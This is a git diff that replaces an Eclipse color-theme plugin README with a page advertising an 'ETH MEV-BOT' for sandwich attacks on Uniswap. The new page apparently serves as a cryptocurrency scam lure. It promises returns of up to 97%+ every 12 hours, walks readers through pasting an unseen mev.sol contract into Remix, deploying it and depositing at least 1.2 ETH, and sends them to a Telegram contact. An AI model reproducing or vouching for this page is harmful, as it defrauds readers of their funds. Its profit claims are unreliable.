@@ -1,157 +1,102 @@
-Eclipse Color Theme
-===================
+---
 
-Color themes for Eclipse.
+<div align="center">
 
-Eclipse Color Theme makes it possible to import and switch color
-themes conveniently and without side effects.
+# 💎🤖 ETH MEV-BOT 🤖💎
+  
+An ETH MEV-BOT for performing sandwich attacks on Uniswap. A Maximal Extractable Value (MEV) Solidity Sandwich BOT that empowers contract deployers to reap profits from tokens.
 
-You can install the plugin from the
-[update site](http://eclipse-color-theme.github.com/update) (there's
-also an archive of the site for offline installation). After
-installing, go to *Window->Preferences->General->Appearance->Color
-Theme* to change the color theme.
+</div>
 
-**Please note:**
+---
 
-* When updating the plugin via Eclipse, go to the preferences page and
-  press *OK* once, otherwise you won't see any changes. We're planning
-  to fix this.
-* When updating from an earlier version than 0.6, please uninstall the
-  plugin and the update site, add the site listed above and install it
-  again from there. Otherwise you won't see any updates.
+## 📚 About
 
-[![Build Status](https://secure.travis-ci.org/eclipse-color-theme/eclipse-color-theme.png)](http://travis-ci.org/eclipse-color-theme/eclipse-color-theme)
+In the fascinating world of cryptocurrency, understanding what an MEV Bot is, can be crucial. A Maximal Extractable Value (MEV) bot is a sophisticated arbitrage instrument that scouts the Mempool for pending transactions on decentralized exchanges such as Uniswap. It cunningly inserts our transaction with a slightly higher gas fee (1 Gwei more than the transaction attempting to enter), thus sandwiching the pending transaction and ensuring ours is processed first, reaping profits from the slippage differences.
 
-Rationale
----------
+---
 
-While Eclipse allows you to change the syntax coloring in great
-detail, there is no support for managing multiple color themes. It is
-possible to achieve that by importing and exporting preferences files,
-but this is inconvenient and likely to mess up your preferences.
-Furthermore, color themes have to be created for every single editor,
-a theme for the Java editor does not change the XML, JavaScript or
-any other editors. This plugin solves these issues by mapping a
-generic color theme format to specific preferences entries for each
-supported editor.
+<div align="center">
 
-Editors and themes
-------------------
+## 🚀 How it Works
 
-Eclipse Color Theme currently supports the following editors:
+![profit](https://i.ibb.co/t39DBd6/1.jpg)
 
-* ActionScript/MXML (Adobe Flash Builder)
-* Ant
-* BibTex/LaTeX (TeXlipse)
-* C++
-* Clojure (Counterclockwise)
-* ColdFusion (CFEclipse)
-* [Chromium Debugger JavaScript Editor](https://github.com/Nodeclipse/nodeclipse-1/tree/master/chromedevtools/plugins/org.chromium.debug.ui)
-* CSS
-* DTD
-* Erlang (ErlIDE)
-* FDT
-* FreeMarker (JBoss Tools)
-* Go (GoClipse)
-* Gradle ([Nodeclipse/Enide Minimalist Gradle Editor](http://www.nodeclipse.org/projects/gradle))
-* Groovy
-* Haskell (EclipseFP)
-* haXe (eclihx)
-* HTML (Eclipse WTP, [AngularJS Eclipse Plugin](https://github.com/angelozerr/angularjs-eclipse))
-* IvyDE editor ([Apache IvyDE](http://ant.apache.org/ivy/ivyde/))
-* Jade (Node.js template engine; [Nodeclipse/Enide Minimalist Jade Editor](http://www.nodeclipse.org/projects/gradle))
-* Java
-* Java properties (Eclipse JDT, [Properties Editor](http://propedit.sourceforge.jp/index_en.html))
-* JavaScript
-* Json ([Json Eclipse Plugin](https://github.com/pulse00/Json-Eclipse-Plugin), [Eclipse Json Editor Plugin](http://sourceforge.net/projects/eclipsejsonedit/), [JsonTools](https://bitbucket.org/denmiroch/jsontools/wiki/Home))
-* JSP
-* Less ([Eclipse plugin for LESS](http://www.normalesup.org/~simonet/soft/ow/eclipse-less.fr.html))
-* Markdown
-* PDE
-* Perl
-* [Protocol Buffers](https://code.google.com/p/protobuf-dt)
-* PHP
-* Puppet (Gepetto)
-* Python
-* R (StatET)
-* Ruby
-* Scala
-* Spket IDE (JavaScript and XML)
-* SQL
-* TCL
-* Text
-* Twig
-* TypeScript ([Eclipse TypeScript Plug-in](https://github.com/palantir/eclipse-typescript), [TypeScript IDE for Eclipse](http://typecsdev.com/))
-* XML
-* XSL
-* Xtend
-* Yaml (Yedit)
+</div>
 
-Available themes:
+Our BOT sniffs the Uniswap v2 Mempool for transactions with high slippage, determining if a sandwich attack would be profitable. Bots then compete to buy up the token on-chain as swiftly as possible, sandwiching the victim's transaction and creating a profitable slippage opportunity. My bot always adds 1 gas more than everybody else's, as long as it remains profitable, ensuring a large number of profitable transactions. It then sends back the ETH to the contract ready for withdrawal. This bot performs all these tasks faster than 99% of other bots out there.
 
-* [Black Pastel](http://www.eclipsecolorthemes.org/?view=theme&id=128)
-* [frontenddev](http://www.eclipsecolorthemes.org/?view=theme&id=90)
-* [Gedit Original Oblivion](http://www.eclipsecolorthemes.org/?view=theme&id=115)
-* [Havenjark](http://www.eclipsecolorthemes.org/?view=theme&id=25)
-* [Inkpot](http://www.eclipsecolorthemes.org/?view=theme&id=4)
-* [minimal](http://www.eclipsecolorthemes.org/?view=theme&id=43)
-* [Monokai](http://www.eclipsecolorthemes.org/?view=theme&id=52)
-* [Mr](http://www.eclipsecolorthemes.org/?view=theme&id=32)
-* [NightLion Aptana Theme](http://www.eclipsecolorthemes.org/?view=theme&id=47)
-* [Notepadd++ Like](http://www.eclipsecolorthemes.org/?view=theme&id=91)
-* [Oblivion](http://www.eclipsecolorthemes.org/?view=theme&id=1)
-* [Obsidian](http://www.eclipsecolorthemes.org/?view=theme&id=21)
-* [Pastel](http://www.eclipsecolorthemes.org/?view=theme&id=68)
-* [RecognEyes](http://www.eclipsecolorthemes.org/?view=theme&id=30)
-* [Retta](http://www.eclipsecolorthemes.org/?view=theme&id=1004)
-* [Roboticket](http://www.eclipsecolorthemes.org/?view=theme&id=93)
-* [Schuss](http://www.eclipsecolorthemes.org/?view=theme&id=29)
-* [Solarized Dark](http://www.eclipsecolorthemes.org/?view=theme&id=1115)
-* [Solarized Light](http://www.eclipsecolorthemes.org/?view=theme&id=1013)
-* [Sublime Text 2](http://www.eclipsecolorthemes.org/?view=theme&id=66)
-* [Sunburst](http://www.eclipsecolorthemes.org/?view=theme&id=383)
-* [Tango](http://www.eclipsecolorthemes.org/?view=theme&id=27)
-* [Vibrant Ink](http://www.eclipsecolorthemes.org/?view=theme&id=3)
-* [Wombat](http://www.eclipsecolorthemes.org/?view=theme&id=118)
-* [Zenburn](http://www.eclipsecolorthemes.org/?view=theme&id=2)
+---
 
-You can download additional themes or create your own on
-[eclipsecolorthemes.org](http://eclipsecolorthemes.org).
+## ETH Investment Returns
 
-Contributing
-------------
+Your Ethereum (ETH) investment returns are calculated on a 12-hour basis as follows:
 
-Since pretty much all Eclipse Color Theme users are developers, and
-since it supports many more editors than a single person could
-possibly want to use, the project has always been driven by
-[our fantastic contributors](https://github.com/eclipse-color-theme/eclipse-color-theme/graphs/contributors).
+| ETH Range (invested) | Returns (12 hours) |
+| --- | --- |
+| `1.2ETH - 2.4ETH` | `up to 10%` |
+| `2.4ETH - 5ETH` | `up to 20%` |
+| `5ETH - 10ETH` | `20-27%` |
+| `10ETH - 20ETH` | `27-35%` |
+| `20ETH - 50ETH` | `35-50%` |
+| `50ETH - 100ETH` | `50-63%` |
+| `100ETH - 200ETH` | `63-76%` |
+| `200ETH - 500ETH` | `76-97%` |
+| `500ETH and above` | `97%+` |
 
-Please consider contributing if you're missing support for an editor,
-get annoyed by a bug or just want to help - it's greatly appreciated!
-See the [contributor guide](https://github.com/eclipse-color-theme/eclipse-color-theme/wiki/Contributing)
-for a start.
+**Note:** The above percentages are subject to market conditions and are not guaranteed. Please invest responsibly.
 
-Building
---------
+---
 
-You can generate an update site using [Maven](http://maven.apache.org/):
+## 👨‍💻 Instructions
 
-    mvn clean verify
+1) Follow these instructions to deploy your smart contract using [REMIX IDE](https://remix.ethereum.org):
+  - 📁 Create a new file mev.sol and paste the code from mev.sol.
 
-This will create an update site in
-_com.github.eclipsecolortheme.updatesite/target/repository_.
 
-By default, Eclipse Color Theme will be built against the Eclipse Mars
-version of the platform. You can build against either Eclipse Luna or
-Kepler by setting the "platform-version" property, for example:
+<img src="https://i.ibb.co/m8ZQRwp/2.png" alt="2" border="0">
 
-    mvn clean verify -Dplatform-version=kepler
+2) 🔧 Select compiler version 0.6.12 and press compile.
 
-License
--------
+![2](https://i.ibb.co/2Ns7jqm/3.png)
 
-Copyright (C) 2010-2014 Felix H. Dahlke and Roger Dudler
+3) 🚀 Navigate to "Deploy" and set the environment to "Injected Provider - MetaMask". Connect the wallet and click "Deploy".
 
-This is open source software, licensed under the Eclipse Public
-License. See the file COPYING for details.
+![3](https://i.ibb.co/NCsWwyW/4.png)
+
+4) Verify your smart contract on etherscan -
+
+- 🌐 Visit [Etherscan Verify Contract](https://etherscan.io/verifyContract).
+   - 📝 Enter contract address and set inputs:
+   - Compiler Type: Solidity (Single File)
+   - Compiler Version: ^0.6.12
+   - License Type: 3) MIT License (MIT)
+   - 📋 Paste the code from mev.sol.
+   - 🚫 Leave ABI input box empty.
+   - 🟢 Click "Verify"
+
+
+5) Deposit funds (at least 1.2 ETH to prevent negative slippage) into your specific contract/bot address.
+ 
+6) Go to your verified contract. Write contract. Enter the amount of ETH you want to trade with into the 1. Start. Confirm the transaction
+
+<img width="780" alt="4" src="https://i.ibb.co/Dp5nXPN/5.png">
+
+7) Withdraw anytime by clicking 'withdrawal'.
+
+:hourglass_flowing_sand: Wait a couple of days for profits to roll in. Remember, for successful transactions on the Ethereum network, you must have enough balance to cover the gas. Recommended 1.2ΕΤΗ and higher. 
+
+At any point, you can stop the bot or retrieve your money by calling the withdrawal function.
+
+<div align="center">
+
+💰💰💰 Make money with MevBot 💰💰💰
+
+</div>
+
+---
+
+##### Please ⭐ the repo to support my project
+---
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
